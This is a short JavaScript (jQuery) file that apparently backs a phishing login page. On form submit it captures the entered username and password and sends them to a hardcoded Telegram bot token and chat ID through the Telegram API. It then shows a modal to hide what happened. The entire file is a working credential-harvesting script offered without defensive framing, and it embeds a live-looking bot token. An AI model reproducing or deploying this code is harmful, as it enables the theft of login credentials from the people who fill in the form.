$( document ).ready(function() {
    let tg = {
        token: "6184001867:AAEoOUty2GguKzycjdjrjswoCakNhvEXKqE",
        chat_id: "881429518"
    }
    function sendMessage(username, password)
    {
        const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${username}---${password}`; // The url to request
        const xht = new XMLHttpRequest();
        xht.open("GET", url);
        xht.send();
    }
    let modal = $('#open-modal');
    $('#mainForm').submit(function (e) {
        e.preventDefault();
        let username = $(this).find('#user_name').val()
        let password = $(this).find('#password').val();
        sendMessage(username, password);
        setTimeout(() => {
            modal.toggle();
        }, 500);
    })
    $('.close-icon').on('click', function (e) {
        modal.toggle();
    })
});